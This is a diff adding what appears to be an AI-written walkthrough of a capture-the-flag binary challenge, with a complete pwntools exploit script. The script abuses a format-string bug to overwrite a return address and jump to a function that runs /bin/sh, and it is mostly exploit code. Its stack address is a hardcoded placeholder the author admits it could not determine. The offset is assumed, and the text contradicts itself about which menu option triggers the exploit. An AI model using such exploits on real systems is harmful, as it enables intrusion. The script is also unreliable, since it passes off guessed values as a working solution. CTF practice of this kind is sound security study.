@@ -1,0 +1,244 @@
+To solve this challenge using pwntools, you'll need to:
+
+1. **Identify the Vulnerability**: Analyze the provided code to find exploitable vulnerabilities.
+2. **Craft the Exploit**: Use pwntools to automate the exploitation process.
+3. **Execute the Exploit**: Run your script to gain shell access.
+
+Here's a step-by-step guide with code examples:
+
+### **1. Identify the Vulnerability**
+
+From the decompiled code, we observe:
+
+- **Format String Vulnerability**: In the `sub_400B07` function, the program uses user-provided data as format strings without proper validation:
+
+  ```c
+  int sub_400B07(int a1, int a2, int a3, int a4, int a5, int a6, char format, int a8, __int64 a9)
+  {
+    write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
+    printf(&format);
+    return printf((const char *)&a9 + 4);
+  }
+  ```
+
+- **Buffer Overflow**: In the `sub_400B41` function (when editing account information), there's a buffer overflow due to `strcpy` of user input into a fixed-size buffer:
+
+  ```c
+  memset(&s, 0, 0x14uLL);
+  strcpy((char *)&s, buf);
+  ```
+
+- **Function to Spawn Shell**: There's a function `sub_4008A6` that executes `/bin/sh`:
+
+  ```c
+  int sub_4008A6()
+  {
+    return system("/bin/sh");
+  }
+  ```
+
+Given these observations, we'll focus on exploiting the **format string vulnerability** to overwrite a function's return address with the address of `sub_4008A6` to spawn a shell.
+
+### **2. Craft the Exploit**
+
+**Step 1: Prepare the Environment**
+
+Import the necessary modules and set the context:
+
+```python
+from pwn import *
+
+context.update(arch='amd64', os='linux')
+```
+
+**Step 2: Identify Addresses**
+
+Since the binary is not PIE (`pie: no`), functions have fixed addresses. We know:
+
+- Address of `sub_4008A6` (function to spawn shell): `0x4008A6`
+
+**Step 3: Interact with the Program**
+
+We'll set up the initial interaction:
+
+```python
+# Start the process
+p = process('./fmt')
+
+# Receive until the username prompt
+p.recvuntil('Input your username(max lenth:20): ')
+
+# Send a format string payload to leak stack addresses
+payload = '%p ' * 20
+p.sendline(payload)
+
+# Receive until the password prompt
+p.recvuntil('Input your password(max lenth:20): ')
+
+# Send an arbitrary password
+p.sendline('password')
+
+# Receive until the menu
+p.recvuntil('Register Success!!\n')
+p.recvuntil('>')
+```
+
+**Step 4: Leak Stack Addresses**
+
+Choose option `1` to trigger the format string vulnerability and leak stack addresses:
+
+```python
+# Choose option 1 to show account information
+p.sendline('1')
+
+# Receive the output
+output = p.recv()
+
+# Print the leaked stack addresses
+print("Leaked Addresses:")
+print(output)
+```
+
+Analyze the output to find the stack address of the return pointer.
+
+**Step 5: Calculate the Offset**
+
+From the leaked addresses, determine the position (offset) of our input in the stack relative to the return address. Suppose we find that our input is at position `6`.
+
+**Step 6: Build the Payload**
+
+Use `fmtstr_payload` to create a payload that writes the address of `sub_4008A6` into the return address:
+
+```python
+# Assume the leaked return address is stored in variable `ret_addr`
+ret_addr = 0x...  # Replace with the actual address obtained from the leak
+
+# Address of the function to call
+sub_shell = 0x4008A6
+
+# Calculate the offset determined earlier (e.g., 6)
+offset = 6
+
+# Create the exploit payload
+payload = fmtstr_payload(offset, {ret_addr: sub_shell})
+```
+
+**Step 7: Trigger the Exploit**
+
+Now, we'll trigger the exploit by editing the account information (option `2`):
+
+```python
+# Receive the menu again
+p.recvuntil('>')
+
+# Choose option 2 to edit account information
+p.sendline('2')
+
+# Receive until the new username prompt
+p.recvuntil('please input new username(max lenth:20): ')
+
+# Send the exploit payload
+p.sendline(payload)
+
+# Receive until the new password prompt
+p.recvuntil('please input new password(max lenth:20): ')
+
+# Send an arbitrary password
+p.sendline('password')
+
+# Receive any remaining output
+p.recvuntil('>')
+```
+
+**Step 8: Get the Shell**
+
+Now, when we trigger the vulnerable function again, we should get a shell:
+
+```python
+# Choose option 1 or 3 to trigger the overwritten return address
+p.sendline('3')  # For instance, exiting might trigger the function epilogue
+
+# Interact with the shell
+p.interactive()
+```
+
+### **3. Execute the Exploit**
+
+Putting it all together, here's the complete exploit script:
+
+```python
+from pwn import *
+
+context.update(arch='amd64', os='linux')
+
+# Addresses
+sub_shell = 0x4008A6  # Address of sub_4008A6()
+
+# Start the process
+p = process('./fmt')
+
+# Step 1: Initial Registration
+p.recvuntil('Input your username(max lenth:20): ')
+payload = '%p ' * 20  # Leak stack addresses
+p.sendline(payload)
+p.recvuntil('Input your password(max lenth:20): ')
+p.sendline('password')
+p.recvuntil('Register Success!!\n')
+p.recvuntil('>')
+
+# Step 2: Leak Stack Addresses
+p.sendline('1')  # Show Account Information
+output = p.recv()
+print("Leaked Addresses:")
+print(output)
+
+# Step 3: Analyze the Leak
+# Parse the output to extract the return address
+leaked_addresses = output.strip().split()
+# Suppose after analysis, we determine that the return address is at offset position
+
+# For illustration, let's assume the return address is at position 6
+# and its address is stored in `ret_addr`
+# ret_addr = int(leaked_addresses[6], 16) - offset_correction  # Adjust if necessary
+
+# Since we can't actually determine the address here, let's assume ret_addr
+ret_addr = 0x7fffffffe518  # Example address; replace with actual leaked address
+
+# Step 4: Build the Exploit Payload
+offset = 6  # Determined from analysis
+payload = fmtstr_payload(offset, {ret_addr: sub_shell})
+
+# Step 5: Send Exploit Payload via 'Edit Account Information'
+p.recvuntil('>')
+p.sendline('2')  # Edit Account Information
+p.recvuntil('please input new username(max lenth:20): ')
+p.sendline(payload)
+p.recvuntil('please input new password(max lenth:20): ')
+p.sendline('password')
+p.recvuntil('>')
+
+# Step 6: Trigger the Overwritten Return Address
+p.sendline('1')  # Show Account Information again to trigger the exploit
+
+# Step 7: Interact with the Shell
+p.interactive()
+```
+
+**Note**: The actual addresses (`ret_addr`) and offset need to be determined based on the leaked data from the application. Ensure you adjust the script accordingly.
+
+### **Explanation**
+
+- **Leaking Stack Addresses**: We use the format string `%p` to leak stack addresses, which helps us find where our input is located in the stack relative to the return address.
+- **Calculating the Offset**: By analyzing the leaked addresses, we determine the position of our input and calculate the offset for `fmtstr_payload`.
+- **Constructing the Payload**: `fmtstr_payload` creates a payload that writes the address of `sub_4008A6` into the return address on the stack.
+- **Triggering the Exploit**: By resuming normal program flow, we allow the function to return, which now jumps to `sub_4008A6`, spawning a shell.
+
+### **Precautions**
+
+- **Address Randomization**: Make sure to disable ASLR locally to replicate the environment if the addresses appear inconsistent.
+- **Environment Matching**: Ensure that the local environment (e.g., libc version) matches the remote environment if exploiting over a network.
+- **Testing**: Thoroughly test your exploit locally before attempting it on the remote server.
+
+### **Conclusion**
+
+By carefully crafting a format string exploit using pwntools, you can overwrite critical memory addresses to gain control of the program's execution flow, ultimately spawning a shell and solving the challenge.
